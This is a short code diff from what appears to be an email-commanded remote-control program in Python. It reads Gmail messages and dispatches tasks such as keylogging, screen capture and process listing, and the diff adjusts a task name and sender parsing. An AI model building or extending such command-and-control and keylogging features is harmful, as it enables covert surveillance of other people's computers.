@@ -28,7 +28,7 @@ def handle(myAr, mail):
             service.keylogger(int(duration))
         if task == "[screen_capture]":
             service.screenshot()
-        if task == "[list_app]":
+        if task == "[list_apps]":
             service.listRunningApplication()
         if task == "[list_processes]":
             service.listRunningProcess()
@@ -173,9 +173,12 @@ def CheckMail(creds):
                 for values in email_data:
                     name = values["name"]
                     if name == "From":
-                        # using RegEx
-                        from_data = re.findall(r"<(.*?)>", values["value"])
-                        from_mail = from_data[0]
+                        if values["value"].find("<") == -1:
+                            from_mail = values["value"]
+                        else:
+                            # using RegEx
+                            from_data = re.findall(r"<(.*?)>", values["value"])
+                            from_mail = from_data[0]
                         print(from_mail)
                         if msg["payload"].get("parts", -1) != -1:
                             for part in msg["payload"]["parts"]:
@@ -208,6 +211,7 @@ def CheckMail(creds):
                             text = byte_code.decode("utf-8")
                             myAr = text.splitlines()
                             handle(myAr, from_mail)
+
                             # mark the message as read, handle and send gmail message
                             msg = (
                                 service.users()
